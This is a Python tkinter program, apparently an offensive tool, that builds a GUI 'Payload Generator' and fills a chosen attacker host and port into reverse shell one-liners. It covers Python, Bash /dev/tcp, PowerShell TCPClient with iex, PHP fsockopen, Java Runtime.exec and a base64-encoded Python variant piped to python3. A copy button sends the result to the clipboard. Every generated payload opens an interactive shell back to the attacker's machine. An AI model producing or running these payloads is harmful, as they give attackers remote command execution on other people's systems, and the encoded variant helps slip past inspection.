import tkinter as tk
from tkinter import scrolledtext
import base64
import os

BG = "#0D0D0D"
ACCENT = "#00FF41"
TEXT = "#FFFFFF"
DARK = "#1A1A1A"

class PayloadGenerator:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("💣 Payload Generator")
        self.root.configure(bg=BG)
        self.root.geometry("800x600")
        self.build_ui()
        self.root.mainloop()

    def build_ui(self):
        tk.Label(self.root, text="💣 Payload Generator",
                bg=BG, fg=ACCENT,
                font=("monospace", 16, "bold")).pack(pady=10)

        # Settings
        settings = tk.LabelFrame(self.root,
                                text="Settings",
                                bg=BG, fg=ACCENT,
                                font=("monospace", 10))
        settings.pack(fill=tk.X, padx=10, pady=5)

        fields = [("LHOST:", "192.168.1.100"),
                 ("LPORT:", "4444")]
        self.entries = {}
        for label, default in fields:
            f = tk.Frame(settings, bg=BG)
            f.pack(fill=tk.X, padx=5, pady=2)
            tk.Label(f, text=label, bg=BG, fg=TEXT,
                    font=("monospace", 10),
                    width=10).pack(side=tk.LEFT)
            e = tk.Entry(f, bg=DARK, fg=ACCENT,
                        font=("monospace", 10),
                        insertbackground=ACCENT)
            e.insert(0, default)
            e.pack(side=tk.LEFT, fill=tk.X, expand=True)
            self.entries[label] = e

        # Payload types
        btn_frame = tk.Frame(self.root, bg=BG)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        payloads = [
            ("🐍 Python", self.python_payload),
            ("🐚 Bash", self.bash_payload),
            ("💻 PowerShell", self.ps_payload),
            ("🌐 PHP", self.php_payload),
            ("☕ Java", self.java_payload),
            ("🔒 Base64", self.base64_payload),
        ]

        for text, cmd in payloads:
            tk.Button(btn_frame, text=text,
                     bg=DARK, fg=ACCENT,
                     font=("monospace", 9),
                     command=cmd,
                     relief=tk.FLAT).pack(
                         side=tk.LEFT, padx=2)

        self.output = scrolledtext.ScrolledText(
            self.root, bg=DARK, fg=ACCENT,
            font=("monospace", 10))
        self.output.pack(fill=tk.BOTH, expand=True,
                        padx=10, pady=5)

        tk.Button(self.root, text="📋 Copy",
                 bg=ACCENT, fg=BG,
                 command=self.copy).pack(pady=5)

    def get_host_port(self):
        host = self.entries["LHOST:"].get()
        port = self.entries["LPORT:"].get()
        return host, port

    def show(self, payload):
        self.output.delete(1.0, tk.END)
        self.output.insert(1.0, payload)

    def copy(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(
            self.output.get(1.0, tk.END))

    def python_payload(self):
        h, p = self.get_host_port()
        self.show(
            f"import socket,subprocess,os\n"
            f"s=socket.socket()\n"
            f"s.connect(('{h}',{p}))\n"
            f"os.dup2(s.fileno(),0)\n"
            f"os.dup2(s.fileno(),1)\n"
            f"os.dup2(s.fileno(),2)\n"
            f"subprocess.call(['/bin/sh','-i'])")

    def bash_payload(self):
        h, p = self.get_host_port()
        self.show(
            f"bash -i >& /dev/tcp/{h}/{p} 0>&1")

    def ps_payload(self):
        h, p = self.get_host_port()
        self.show(
            f"$client = New-Object "
            f"System.Net.Sockets.TCPClient('{h}',{p});\n"
            f"$stream = $client.GetStream();\n"
            f"[byte[]]$bytes = 0..65535|%{{0}};\n"
            f"while(($i = $stream.Read($bytes,0,$bytes.Length))"
            f" -ne 0){{\n"
            f"$data = (New-Object -TypeName "
            f"System.Text.ASCIIEncoding).GetString"
            f"($bytes,0,$i);\n"
            f"$sendback = (iex $data 2>&1 | "
            f"Out-String);\n"
            f"$sendback2=$sendback+'PS '+"
            f"(pwd).Path+'> ';\n"
            f"$sendbyte = ([text.encoding]::ASCII)"
            f".GetBytes($sendback2);\n"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);\n"
            f"$stream.Flush();}}")

    def php_payload(self):
        h, p = self.get_host_port()
        self.show(
            f"<?php\n"
            f"$sock=fsockopen('{h}',{p});\n"
            f"exec('/bin/sh -i <&3 >&3 2>&3');\n"
            f"?>")

    def java_payload(self):
        h, p = self.get_host_port()
        self.show(
            f"Runtime r=Runtime.getRuntime();\n"
            f"String[] commands = {{\"/bin/bash\","
            f"\"-c\",\"exec 5<>/dev/tcp/{h}/{p};"
            f"cat <&5 | while read line; do $line 2>&5 >&5; "
            f"done\"}};\n"
            f"Process p=r.exec(commands);")

    def base64_payload(self):
        h, p = self.get_host_port()
        payload = (f"import socket,subprocess,os;"
                  f"s=socket.socket();"
                  f"s.connect(('{h}',{p}));"
                  f"os.dup2(s.fileno(),0);"
                  f"os.dup2(s.fileno(),1);"
                  f"os.dup2(s.fileno(),2);"
                  f"subprocess.call(['/bin/sh','-i'])")
        encoded = base64.b64encode(
            payload.encode()).decode()
        self.show(
            f"echo {encoded}|base64 -d|python3")

if __name__ == "__main__":
    PayloadGenerator()
